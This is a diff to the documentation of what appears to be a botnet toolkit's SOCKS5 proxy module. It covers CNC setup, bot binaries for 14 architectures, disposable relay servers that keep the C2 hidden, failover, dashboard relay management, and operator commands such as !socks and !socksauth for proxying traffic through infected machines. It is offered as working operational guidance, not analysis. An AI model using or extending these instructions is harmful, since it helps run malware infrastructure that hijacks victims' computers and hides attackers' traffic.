@@ -16,7 +16,7 @@ User ──[SOCKS5]──▶ Relay Server ◀──[backconnect TLS]── Bot �
 - Bot connects **OUT** to the relay — never opens a port
 - Users connect to the relay's SOCKS5 port with credentials
 - C2 address is never exposed — relay is separate infrastructure
-- If the relay gets burned, deploy a new one without touching the C2
+- If the relay gets burned, deploy a new one and add it to the CNC dashboard — no rebuilds
 
 ### Direct Mode
 
@@ -38,15 +38,12 @@ User ──[SOCKS5]──▶ Bot:1080 ──▶ Target
 python3 setup.py    # Option 1: Full Setup
 ```
 
-During setup you'll be asked for:
-- **Relay endpoints** — comma-separated `host:port` (e.g. `relay1.example.com:9001,relay2.example.com:9001`)
-  - Press Enter to skip if you'll specify at runtime
-- **Proxy credentials** — default username/password for SOCKS5 auth (default: `vision:vision`)
-
 Setup builds three binaries:
 - `server` — CNC server
 - `relay_server` — relay server
 - `bins/` — bot binaries (14 architectures)
+
+Proxy credentials are **auto-generated** (12-char random) and printed during setup. Relay endpoints are **never baked** — managed at runtime via the CNC dashboard.
 
 ### 2. Deploy the Relay
 
@@ -56,11 +53,14 @@ Copy `relay_server` to a VPS (**not** your C2 server):
 # Minimal — auth key is baked in from setup.py
 ./relay_server
 
-# With stats monitoring
+# Report stats to CNC dashboard (recommended)
+./relay_server -name relay-us -c2 https://cnc.example.com/api/relay-report -interval 30
+
+# With stats monitoring (local plaintext endpoint)
 ./relay_server -stats 127.0.0.1:9090
 
 # Custom ports
-./relay_server -cp 9001 -sp 1080 -stats 127.0.0.1:9090
+./relay_server -cp 9001 -sp 1080
 
 # With your own TLS cert
 ./relay_server -cert server.crt -keyfile server.key
@@ -72,35 +72,45 @@ Copy `relay_server` to a VPS (**not** your C2 server):
 | 9001 | Control port (TLS) — bots connect here |
 | 1080 | SOCKS5 port — proxy clients connect here |
 
-### 3. Activate from CNC
+### 3. Register the Relay in CNC
+
+Open the **SOCKS tab** in the web dashboard → the relay health section shows all registered relays.
+
+- Click **+ Add Relay** — enter `host:controlPort:socksPort` (e.g. `relay.example.com:9001:1080`)
+- The relay is saved to `cnc/db/relays.json` — persists across CNC restarts
+- Once the relay binary is running with `-c2 <url>`, its live stats appear on the card within one push interval
+
+### 4. Activate from CNC
+
+**Web dashboard** — left-click any bot → sidebar → **Start SOCKS** → pick mode and relay from dropdown
 
 **TUI mode** — go to Socks Manager (option 3 on main menu):
-- `s` — Quick start (uses pre-configured relay + credentials)
 - `c` — Custom relay (enter relay:port manually)
 - `d` — Direct mode (enter port, opens listener on bot)
 - `x` — Stop proxy
 
-**Split/telnet mode:**
+**Telnet/split mode:**
 ```
-!socks                          # Use pre-configured relays
-!socks relay.example.com:9001   # Specific relay
-!socks r1:9001,r2:9001          # Multiple relays (comma-separated)
+!socks relay.example.com:9001   # Backconnect to specific relay
+!socks r1:9001,r2:9001          # Multiple relays with failover
 !socks 1080                     # Direct mode (local listener on port 1080)
 !stopsocks                      # Stop proxy
 !socksauth newuser newpass      # Change credentials at runtime
 ```
 
-### 4. Connect as a User
+> **Note:** `!socks` with no arguments now returns a usage error — relay address must always be supplied. There are no baked-in endpoints.
+
+### 5. Connect as a User
 
 ```bash
 # curl
-curl --socks5 relay.example.com:1080 -U vision:vision http://target.com
+curl --socks5 relay.example.com:1080 -U <user>:<pass> http://target.com
 
 # proxychains (add to /etc/proxychains4.conf)
-socks5 relay.example.com 1080 vision vision
+socks5 relay.example.com 1080 <user> <pass>
 
 # Direct mode (no relay)
-curl --socks5 BOT_IP:1080 -U vision:vision http://target.com
+curl --socks5 BOT_IP:1080 -U <user>:<pass> http://target.com
 ```
 
 ---
@@ -116,11 +126,35 @@ curl --socks5 BOT_IP:1080 -U vision:vision http://target.com
 | `-key` | (built-in) | Auth key override — defaults to key baked in by setup.py |
 | `-cert` | (auto) | TLS certificate file — auto-generates self-signed if empty |
 | `-keyfile` | (auto) | TLS private key file |
-| `-stats` | (off) | Stats endpoint address (e.g. `127.0.0.1:9090`) |
+| `-stats` | (off) | Local stats endpoint (e.g. `127.0.0.1:9090`) — plaintext CLI |
+| `-c2` | (off) | CNC relay-report URL — pushes stats periodically |
+| `-interval` | `30` | Stats push interval in seconds (requires `-c2`) |
+| `-name` | `relay` | Relay name shown in CNC dashboard (requires `-c2`) |
 
-### Stats Monitoring
+### CNC Stats Reporting
 
-Start with `-stats`:
+Start relay with `-c2` to push live stats to the CNC dashboard:
+
+```bash
+./relay_server \
+  -name relay-us-1 \
+  -c2 https://cnc.example.com/api/relay-report \
+  -interval 30
+```
+
+The CNC SOCKS tab shows a card per relay with:
+- Status dot (green = seen within 90s, red = stale/down)
+- Active connections, total sessions, failed sessions
+- Bandwidth up/down
+- Connected bot count
+- Uptime
+- Last seen timestamp
+
+Stats are authenticated via the `X-Relay-Key` header (must match `MAGIC_CODE` from setup.py).
+
+### Local Stats Monitoring
+
+Start with `-stats` for a local plaintext endpoint:
 ```bash
 ./relay_server -stats 127.0.0.1:9090
 ```
@@ -167,28 +201,35 @@ Bot → Relay:   RELAY_PING\n                   (keepalive, every 60s)
 
 ---
 
+## Relay Management (Dashboard)
+
+All relay lifecycle management happens in the **SOCKS tab** of the web dashboard. No rebuilds required.
+
+| Action | How |
+|--------|-----|
+| Add relay | SOCKS tab → "+ Add Relay" → enter `host:controlPort:socksPort` |
+| Remove relay | Click × on relay card |
+| View live stats | Relay card updates every 15s (requires relay running with `-c2`) |
+| Update credentials | TUI or `!socksauth <user> <pass>` at runtime |
+
+Relay list is stored in `cnc/db/relays.json` — survives CNC restarts.
+
+---
+
 ## Multi-Relay Failover
 
-Bots support unlimited relay endpoints with automatic failover:
+Bots support unlimited relay endpoints with automatic failover when multiple addresses are supplied at runtime:
 
 1. **Shuffle on startup** — bots randomize the relay list so they spread across relays
 2. **Quick rotation** — on disconnect, bot tries the next relay (0.5–2s jitter)
 3. **Exponential backoff** — after all relays fail one full rotation, wait 5s → 10s → 20s → 40s → 60s (cap)
 4. **Auto-reconnect** — keeps trying until `!stopsocks` is issued
 
-### Configure Multiple Relays
+### Multiple Relays at Runtime
 
-**At build time (setup.py):**
 ```
-Relay endpoints: relay-us.example.com:9001,relay-eu.example.com:9001,relay-ap.example.com:9001
+!socks relay-us.example.com:9001,relay-eu.example.com:9001,relay-ap.example.com:9001
 ```
-
-**At runtime (CNC):**
-```
-!socks relay-us.example.com:9001,relay-eu.example.com:9001
-```
-
-Pre-configured endpoints are always appended as fallbacks when specifying at runtime.
 
 ---
 
@@ -196,9 +237,8 @@ Pre-configured endpoints are always appended as fallbacks when specifying at run
 
 ### Default Credentials
 
-Set during `setup.py` — baked into the bot binary:
-- Default: `vision:vision`
-- All SOCKS5 connections require these credentials
+Generated automatically by `setup.py` — unique per build, printed to console during setup.
+All SOCKS5 connections require these credentials.
 
 ### Change at Runtime
 
@@ -207,45 +247,23 @@ From CNC:
 !socksauth myuser mypass
 ```
 
-This updates credentials on all bots. Takes effect immediately for new connections.
+Updates credentials on the targeted bot immediately for new connections.
 
-### Update in Config
-
-`python3 setup.py` → Option 3 (Relay Endpoints Update) lets you change default credentials and rebuild.
-
----
-
-## Updating Relay Endpoints
-
-### Option 3 in setup.py
+### Rebuild with New Credentials
 
 ```bash
-python3 setup.py    # Select option 3
-```
-
-This will:
-1. Show current relay endpoints (decrypted)
-2. Let you enter new endpoints (comma-separated)
-3. Update proxy credentials
-4. Re-encrypt all config blobs with fresh AES key
-5. Rebuild relay + bot binaries
-
-**Existing deployed bots will NOT auto-update** — you must redeploy the new bot binaries.
-
-### Runtime Override
-
-If you need to point bots at a new relay without redeploying:
-```
-!socks newrelay.example.com:9001
+python3 setup.py    # Option 3: Update Config
 ```
 
 ---
 
 ## Security Notes
 
-- **Relay is disposable** — deploy on cheap VPS, burn and replace as needed
+- **Relay is disposable** — deploy on cheap VPS, burn and replace; just add the new one in dashboard
 - **C2 never exposed** — bot connects to relay, not the other way around
-- **TLS everywhere** — bot↔relay uses TLS 1.2+ (same as bot↔C2)
+- **No relay baked in binary** — relay address supplied at runtime; compromising a bot binary reveals nothing about relay infrastructure
+- **TLS everywhere** — bot↔relay uses TLS 1.3 (same as bot↔C2)
 - **Auth required** — both bot→relay (magic code) and user→SOCKS5 (credentials) are authenticated
-- **Bind stats to localhost** — always use `127.0.0.1` for the `-stats` flag, never `0.0.0.0`
+- **Stats endpoint is authenticated** — relay POSTs stats with `X-Relay-Key` header; CNC rejects anything that doesn't match `MAGIC_CODE`
+- **Bind local stats to localhost** — always use `127.0.0.1` for the `-stats` flag, never `0.0.0.0`
 - **Separate relay from C2** — the whole point is isolation; don't run both on the same server
